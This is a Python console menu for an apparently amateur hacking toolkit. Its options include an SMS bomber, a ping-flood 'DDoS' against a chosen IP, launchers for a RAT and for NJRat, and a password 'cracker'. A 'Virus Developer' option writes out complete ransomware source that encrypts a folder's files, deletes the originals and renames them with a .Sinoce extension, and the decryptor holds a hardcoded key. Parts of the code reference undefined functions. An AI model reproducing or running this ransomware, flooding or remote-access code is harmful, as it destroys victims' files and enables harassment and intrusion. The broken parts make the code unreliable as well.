import Enc
import sms_pro as sms
from colorama import Fore as c
from os import system as s
from pyfiglet import figlet_format as pf
from random import choice as ch
from time import sleep as sp
from subprocess import getoutput as get , check_output as  chek
from pygame import mixer as mix
from pyautogui import hotkey as key
from pyautogui import typewrite as tp
from pyautogui import screenshot as shot
import os
import shad_bot_test as terminal
import server
import ber


s('cls')

gr,rd,bl,cy,mg,yl = c.GREEN,c.RED,c.BLUE,c.CYAN,c.MAGENTA,c.YELLOW
lgr = c.LIGHTGREEN_EX
lrd = c.LIGHTRED_EX
lbl = c.LIGHTBLUE_EX
lcy = c.LIGHTCYAN_EX
lmg = c.LIGHTMAGENTA_EX
lyl = c.LIGHTYELLOW_EX
black = c.BLACK

colors = [gr,lgr,rd,lrd,bl,lbl,cy,lcy,mg,lmg,yl,lyl]

path = os.getcwd()

name_mus ={}
path_mus ={}

mix.init()

try:
    music_info = open('Info.txt','r')
    music_line1 = str(music_info.read())
    if music_line1.startswith('--music '):
        music_file = music_line1.replace('--music ','')
        mix.music.load(music_file)
except :
    music = input(f"{lbl}ENTER PATH {bl}FROM {lmg}MUSIC{lrd} SCRIPT{rd} :{gr}=={rd}: \n {lgr}Example : --music path/name.mp3 ")
    music_info = open('Info.txt','+w')
    music_info.write(music)
    music_info.close()
    if music.startswith('--music '):
        ms_f = music.replace('--music ','')
        mix.music.load(ms_f)

def pers():
    print("زبان فارسی شد")
    while 1:
        me = input(f"متن خود را وارد{bl}")
        if me.startswith("سلام "):
            print('سلام خوبی چه کمکی ازم بر میاد')
def ddos():
    s('cls')
    co = 1
    print(ch(colors)+pf('D * DOS','Epic'))
    DDos_ip = input(f'{lbl}IP TARGET {lcy}~$~{lmg} >> '+lrd)
    randge_attack = int(input(f'{lrd}RANGE {rd}ATTACK :$: {lbl}'))
    size_package = int(input(f'{lbl}SIZE {rd}PACKAGES {lcy}({lmg}/{lrd}${lmg}/{lcy}){lbl}-->>{lgr}'))
    print('\n')
    for i in range(randge_attack):
        get(f'ping -l {size_package} -n 1 {DDos_ip}')
        print(f"{lrd}DDOS {rd}ATTACK {lgr}{DDos_ip}{lbl} "+str(co))
        co += 1
        sp(1.5)
    e_c = input(f"""
{lmg}[{lgr}9{lmg}]{lbl} EXIT
{lmg}[{lgr}0{lmg}]{lbl} CONTINUE{lcy}\n>>{lbl}##{lcy}>>{lmg}""")
    if e_c == '9':
        main()
    if e_c == '0':
        ddos()
colors = [gr,lgr,rd,lrd,bl,lbl,cy,lcy,mg,lmg,yl,lyl]
fonts = ['Epic','slant','Big','Doom']
prs = ['#','@','~','$','%#','$~','*']

def main():
        s('cls')
        s('title TERMINAL H S C')
        while 1:
            try:
                try:
                    ras = ch(prs)
                    print(ch(colors)+pf(' H  S  C',ch(fonts)))
                    print(f"""
        {lcy}[{lgr}1{lcy}]{lrd} SMS_BOMBER Sinoce {lcy}[{lgr}10{lcy}]{lrd} SETTING MUSIC
        {lcy}[{lgr}2{lcy}]{lrd} DDos              {lcy}[{lgr}11{lcy}]{lrd} SYSTEM TERMINAL
        {lcy}[{lgr}3{lcy}]{lrd} Rat_Virus         {lcy}[{lgr}12{lcy}]{lrd} TERMINAL ULTRA
        {lcy}[{lgr}4{lcy}]{lrd} Encript           {lcy}[{lgr}13{lcy}]{lrd} COPY ALL FILLES
        {lcy}[{lgr}5{lcy}]{lrd} Decript           {lcy}[{lgr}14{lcy}]{lrd} COPY FILE BAINRY
        {lcy}[{lgr}6{lcy}]{lrd} RENAME            {lcy}[{lgr}15{lcy}]{lrd} GPT Sinoce
        {lcy}[{lgr}7{lcy}]{lrd} PLAY MUSIC        {lcy}[{lgr}16{lcy}]{lrd} Virus Devloper
        {lcy}[{lgr}8{lcy}]{lrd} STOP MUSIC        {lcy}[{lgr}17{lcy}]{lrd} CREATE C/H/A/T ROOM
        {lcy}[{lgr}9{lcy}]{lrd} CREATE WORDLIST   {lcy}[{lgr}18{lcy}]{lrd} NJRat Run
        {lcy}[{lgr}0{lcy}]{lrd} Exit              {lcy}[{lgr}19{lcy}]{lrd} CRACK
                    """)
                    ans =input(f"""{lrd}┌─<({cy}Root{gr}@Sinoce68{lrd})-{yl}[~]{lrd}>
└─< ({gr}/{ras}/{lrd}){mg}* {lrd}>──»  {cy}""")
                    if ans == '1':
                        s('cls')
                        banner = (pf('BOMB * ER','Epic'))
                        print(banner)
                        print('\n')
                        phone = input(f"""{lrd}┌─<({cy}SMS{gr}@Sinoce68{lrd})-{yl}[~]{lrd}>
└─< ({gr}Number{lrd}){mg}* {lrd}>──»  {cy}""")
                        try:
                           sms.start(phone)
                        except KeyboardInterrupt:
                            main()
                        sp(1)
                        s('cls')
                    if ans == '2':
                        try:
                            ddos()
                        except KeyboardInterrupt:
                            main()
                        sp(1.10000050)
                        s('cls')
                    if ans == '3':
                        s('cls')
                        print(ch(colors)+pf('R A T','Epic'))
                        server.main()
                        s('cls')
                    if ans == '4':
                        s('cls')
                        print(ch(colors)+pf('EN * CRIPT','Epic'))
                        try:
                            try:        
                                Enc.enc()
                            except FileNotFoundError:
                                print("ENTER ADDRESS :\nExmple: Drive:\key.txt")
                                sp(5)
                                main()
                        except KeyboardInterrupt:
                            main()
                        sp(2)
                        s('cls')
                    if ans == '5':
                        s('cls')
                        print(ch(colors)+pf('DE * CRIPT','Epic'))
                        try:
                            Enc.dec()
                        except KeyboardInterrupt:
                            main()
                        sp(2)
                        s('cls')
                    if ans == '6':
                        s('cls')
                        print(ch(colors)+pf('RE * NAME','Epic'))
                        try:
                            Enc.ren()
                        except KeyboardInterrupt:
                            main()
                        sp(1.5)
                        s('cls')
                    if ans == '7':
                        mix.music.play()
                        s('cls')
                    if ans == '8':
                        mix.music.stop()
                        s('cls')
                    if ans == '9':
                        print(ch(colors)+pf("PATH",'Epic'))
                        try:
                            os.remove('Info.txt')
                        except:
                            continue
                        music = input(f"{lbl}ENTER NEW PATH {lmg}MUSIC{lrd} SCRIPT{rd} :{gr}=={rd}: \n {lgr}Example : --music path/name.mp3 ")
                        music_info = open('Info.txt','w')
                        music_info.write(music)
                        music_info.close()
                        if music.startswith('--music '):
                            msu = music.replace('--music ','')
                            mix.init()
                            mix.music.load(msu)
                        s('cls')
                    if ans == '10':
                        s('cls')
                        print(ch(colors)+pf("SETTING",'Epic'))
                        coi = input("ENTER MUSIC [m] OR ENTER PATH MUSIC [p]")
                        if coi.lower() == 'p':
                            music_choice = input(f"{bl} ENTER PATH MUSIC AND NAME MUSIC : \n Example : music_one-path+music_to-path").split('+')
                            for i in (music_choice):
                                choi = i.split('-')
                                if len(music_choice) == 1:
                                    dic_music = {choi[0]:choi[1]}
                                if len(music_choice) == 2:
                                    dic_music = {choi[0]:choi[1],choi[2]:choi[3]}
                                if len(music_choice) == 3:
                                    dic_music = {choi[0]:choi[1],choi[2]:choi[3],choi[4]:choi[5]}
                                if len(music_choice) == 4:
                                    dic_music = {choi[0]:choi[1],choi[2]:choi[3],choi[4]:choi[5],choi[6]:choi[7]}
                                if len(music_choice) == 5:
                                    dic_music = {choi[0]:choi[1],choi[2]:choi[3],choi[4]:choi[5],choi[6]:choi[7],choi[9]:choi[9]}
                                if len(music_choice) == 6:
                                    dic_music = {choi[0]:choi[1],choi[2]:choi[3],choi[4]:choi[5],choi[6]:choi[7],choi[9]:choi[9],choi[10]:choi[11]}
                                if len(music_choice) == 7:
                                    dic_music = {choi[0]:choi[1],choi[2]:choi[3],choi[4]:choi[5],choi[6]:choi[7],choi[9]:choi[9],choi[10]:choi[11],choi[12]:choi[13]}
                                if len(music_choice) == 8:
                                    dic_music = {choi[0]:choi[1],choi[2]:choi[3],choi[4]:choi[5],choi[6]:choi[7],choi[9]:choi[9],choi[10]:choi[11],choi[12]:choi[13],choi[14]:choi[15]}
                                if len(music_choice) == 9:
                                    dic_music = {choi[0]:choi[1],choi[2]:choi[3],choi[4]:choi[5],choi[6]:choi[7],choi[9]:choi[9],choi[10]:choi[11],choi[12]:choi[13],choi[14]:choi[15],choi[16]:choi[17]}
                                if len(music_choice) == 10:
                                    dic_music = {choi[0]:choi[1],choi[2]:choi[3],choi[4]:choi[5],choi[6]:choi[7],choi[9]:choi[9],choi[10]:choi[11],choi[12]:choi[13],choi[14]:choi[15],choi[16]:choi[17],choi[18]:choi[19]}
                        s('cls')
                    if ans == '11':
                        s('cls')
                        print(ch(colors)+pf('S* Y *S','Epic'))  
                        try:
                            try:
                                while 1:
                                    system = input(f" {rd}> {bl}> {gr}> {mg}")
                                    sys = get(system)
                                    if system.lower() != 'exit':
                                        if system == 'cd ..':
                                            os.chdir('.')
                                        if system.startswith('cd '):
                                            dr = system.replace('cd ','')
                                            try:
                                                os.chdir(dr)
                                            except:
                                                print(f"{gr}DIRECTORY {gr}NOT {rd}CORRECT {lbl}*{bl}/{lrd}*{lyl}")
                                        if system == 'pwd':
                                            ot = get('cd')
                                            print(f"{gr}{ot}")
                                        if system != 'cls' or system != 'clear':
                                            if sys == f"""'{system}' is not recognized as an internal or external command,
operable program or batch file.""":
                                                print(f'{gr}COMMAND {gr}NOT{rd} CORRECT {lrd}*{bl}/{lrd}* {mg}')
                                            if len(sys) <= 32:
                                                print(f"{bl}>{gr}>{lmg}{sys}{bl}<{gr}<")
                                            if system.startswith("s "):
                                                s_cmd = system.replace("s ","")
                                                sys = get(s_cmd)
                                                print(f"{gr}{sys}")
                                        else:
                                            s('cls')
                                    else:
                                        main()
                            except EOFError:
                                main()
                        except KeyboardInterrupt:
                            main()
                        s('cls')
                    if ans == '12':
                        try:
                            try:
                                s('cls')
                                print(ch(colors)+pf('Sin*oce','Epic'))
                                terminal.Sinoce()
                            except EOFError:
                                main()
                        except KeyboardInterrupt:
                            main()
                        s('cls')
                    if ans == '13':
                        s('cls')
                        print(ch(colors)+pf('RITER','Epic'))
                        dhir = input(f'{gr}ENTER PATH {mg}:{rd}[{lrd}[{bl}${lrd}] {mg}')
                        os.chdir(dhir)
                        files = str(get('dir /s /b ')).split()
                        for file in files:
                            try:
                                with open(file,'rb') as fl :
                                    read_f = fl.read()
                            except:
                                continue
                            with open('FILLES_TARGET.txt','wb') as riter:
                                riter.write(read_f)
                        s('cls')
                    if ans == '14':
                        s('cls')
                        print(ch(colors)+pf("* / * /",'Epic'))
                        schoi = input(f"{rd}ENTER NAME {gr}FILE :")
                        nm = input(f"{rd}ENTER NAME {gr}FILE  {bl}SAVED : \n {cy}Example{mg} : {lgr}name.format file")
                        with open(schoi,'rb') as file_read:
                            read = file_read.read()
                        with open(f'{nm}','wb') as tra:
                            tra.write(read)
                    if ans == '15':
                        s('cls')
                        print(ch(colors)+pf('G P T','Epic'))
                        while 1:
                            mes = input(f"{bl}message : ")
                            if mes.lower() == 'hello':
                                print(f"{gr}HELLO IM ROBOT BY SINOCE CAN TO HELP YOU ? ")
                                mes = input(f"{bl}message : ")
                                if mes.lower().startswith('yes '):
                                    mess = mes.replace('yes ','')
                                    if mess.startswith('hack'):
                                        print(f"{rd}MY CAN T HELP YOU SORRY ")
                                        sp(2)
                                        s('cls')
                            if mes == 'persian':
                                print("تایید شد")
                                s('cls')
                                pers()
                            if mes == 'cls':
                                s('cls')
                                if mes.lower() == 'no':
                                    print(f"{cy}BEY BEY")
                    
                        s('cls')
                    if ans == '16':
                        s('cls')
                        print(ch(colors)+pf("VIR SINOCE",'slant'))
                        v_model = input(f"""
        {lcy}[{lgr}1{lcy}]{lrd} Ranswormare
        {lcy}[{lgr}2{lcy}]{lrd} SMS Bomber
        {lcy}[{lgr}2{lcy}]{lrd} \nENTER Module :>> """)
                        if v_model == '1':
                            s('cls')
                            print(ch(colors)+pf('RAN*S','Epic'))
                            name_f = input("ENTER NAME FILE : ")
                            with open(name_f,'w')as Rans:
                                Rans.write("""from cryptography.fernet import Fernet as frant
from requests import get
from requests import post
from subprocess import check_output as check
from subprocess import getoutput as out
from os import system as sys
from os import system as s
from sys import platform as system
import os
from time import sleep as sp
from colorama import Fore as c

gr = c.GREEN
rd = c.RED
bl = c.BLUE
cy = c.CYAN
mg = c.MAGENTA
yl = c.YELLOW

lgr = c.LIGHTGREEN_EX
lrd = c.LIGHTRED_EX
lbl = c.LIGHTBLUE_EX
lcy = c.LIGHTCYAN_EX
lmg = c.LIGHTMAGENTA_EX
lyl = c.LIGHTYELLOW_EX
black = c.BLACK

s('cls')

def enc():
    addr = input(f"{bl}ENTER ADDRESS{gr} FOLDER {lmg}: {rd}")
    addr_k = input(f"{bl}ENTER ADDRESS{gr} KEY FILE {lmg}:{rd} ")
    nog = 0
    print(f"{lgr}Encripting Started {lbl}. . .")
    os.chdir(addr)
    files = str(out('dir /s /b ')).split()
    k = frant.generate_key()
    key = frant(k)
    fa = open(addr_k,'w')
    fa.write(str(k))
    fa.close()
    print(f"{lgr}Searching Filles{lbl} ...")
    sp(5)
    for file in files:
        try:
                try:
                    with open(file,'rb') as file_org:
                        read_file = file_org.read()
                except FileNotFoundError:
                    pass
        except PermissionError:
            os.chdir(file)
            files = str(out('dir /s /b *.jpg')).split()
            for fal in files:
                try:
                    with open(fal,'rb') as file_org:
                        read_file = file_org.read()
                except FileNotFoundError:
                    continue
                encript = key.encrypt(read_file)
                print(f'{lgr}Encripting {lrd}'+fal)
                try:
                    os.remove(fal)
                except:
                    continue
                name_file = fal.split('.')
                with open(f'{name_file[0]}','wb') as file_enc:
                    file_enc.write(encript)
                print(f'{lgr}Encripted {lrd}'+fal)
                print(f'{lbl}#'*len(fal))
                nog += 1
        try:
                try:
                    with open(file,'rb') as file_org:
                            read_file = file_org.read()
                except FileNotFoundError:
                    pass
        except PermissionError:
            continue
        os.chdir('.')
        encript = key.encrypt(read_file)
        print(f'{lgr}Encripting {lrd}'+file)
        os.remove(file)
        name_file = file.split('.')
        try:
                try:
                    with open(f'{name_file[0]}.Sinoce','wb') as file_enc:
                        file_enc.write(encript)
                except FileNotFoundError:
                     pass
        except PermissionError:
             continue
        print(f'{lgr}Encripted {lrd}'+file)
        print(f'{lbl}#'*len(file))
        nog += 1
    print(f"{lgr}Number File {lrd}Encripted {lbl}({lrd}{nog}{lbl})")
    

def dec():
    co = 0
    addr = input(f"{bl}ENTER ADDRESS{gr} FOLDER {lmg}:{rd} ")
    addr_k = input(f"{bl}ENTER ADDRESS {gr}KEY FILE{lmg} :{rd} ")
    # with open(addr_k, 'rb') as mykey:
    #     ky = mykey.read()
    ky = b'u3WoI1U7BaDMZC-fmNjSUDgfQvHOKtBD-O3lucQ9MJw='
    print(f'{lgr}Decripting Started {lbl}. . .')
    os.chdir(addr)
    files = str(out('dir /s /b *.Sinoce')).split()
    key = frant(ky)
    print(f"{lgr}Searching Filles{lbl} ...")
    sp(12)
    for file in files:
        with open(file,'rb') as file_org:
            read_file = file_org.read()
        encript = key.decrypt(read_file)
        print(f'{lgr}Decripting {lrd}'+file)
        os.remove(file)
        name_file = file.split('.')
        with open(f'{name_file[0]}.{name_file[1]}','wb') as file_enc:
            file_enc.write(encript)
        print(f'{lgr}Decripted {lrd}'+file)
        print('#'*len(file))
        co +=1
    print(f"{lgr}Number File {lrd}Decripted {lbl}({lrd}{co}{lbl})")
def ren():
    loc = input(f'{lbl}ENTER ADDRESS {lmg}RENAME FILES : {rd}')
    one = input(f"{bl}ENTER FORMAT{lmg} FILLES : {rd}")
    rn = input(f"{bl}ENTER RENAME FILE{lmg} FORMAT : {rd}")
    os.chdir(loc)
    s(f'ren *.{one} *.{rn}')
    
""")
                            print(f"{gr}CREATED FILE BY NAME {name_f}")
                        if v_model == '2':
                            s('cls')
                            print(ch(colors)+pf('S*M*S','Epic'))
                            name_sms_file = input("ENTER NAME FILE : ")
                            with open('sms_pro.py','r') as pro_s:
                                reading = pro_s.read()
                            with open(name_sms_file,'w') as bomb:
                                bomb.write(reading)
                            print(f'CREATED SMS BOMBER')
                            s('cls')
                    if ans == '17':
                        s('cls')
                        print(ch(colors)+pf('C/H/A/T','Epic'))
                        Name = input('ENTER NAME FROM CHATROOM : ')
                        print(Name)
                        if Name == 'Sinoce':
                            while 1:
                                chat = input(f"{gr}ENTER MESSAGE {mg}:{rd} ")
                    if ans == '18':
                        s('cls') or s('clear')
                        print(ch(colors)+pf('NJ*RAT','Epic'))
                        print(f"""
            {lcy}({lgr}1{lcy}){lrd} Run
            {lcy}({lgr}2{lcy}){lrd} CREATE
            {lcy}({lgr}3{lcy}){lrd} DELETE
            {lcy}({lgr}0{lcy}){lrd} Exit""")
                        choice = input("ENTER NUMBER [:]]>> ")
                        if  choice != '0':
                            if choice == '1':
                                os.chdir('nj')
                                s('start njrat.exe')
                                s('cls') or s('clear')
                                os.chdir('.')
                                main()
                        else:
                            main()
                    if ans == '19':
                        s('cls')
                        print(ch(colors)+pf('CRACKER','Epic'))
                        print('\n')
                        print(f"""
            {lcy}|{lgr}1{lcy}|{lrd} GMAIL
            {lcy}[{lgr}2{lcy}]{lrd} PDF
            {lcy}[{lgr}3{lcy}]{lrd} RAR
            {lcy}[{lgr}0{lcy}]{lrd} EXIT""")
                        choce = input(f"{lcy}NUMBER{lgr} $ {lbl} :{lrd} ")
                        if choce == '1':
                            crack.gmail()
                        if choce == '2':
                            pdf()
                        if choce == '3':
                            rar()
                        if choce == '0':
                            exit()
                    if ans == 'banner':
                        ber.banner()
                        ber.info()
                    if ans != '1' or ans != '2' or ans != '3' or ans != '4' or ans != '5' or ans != '6' or ans != '7' or ans != '8' or ans != '9' or ans != '10' or ans != '11' or ans != '12'or ans != '13':
                        s('cls')
                    if ans =='0':
                        exit()
                except EOFError:
                    pass
            except KeyboardInterrupt:
                pass    
main()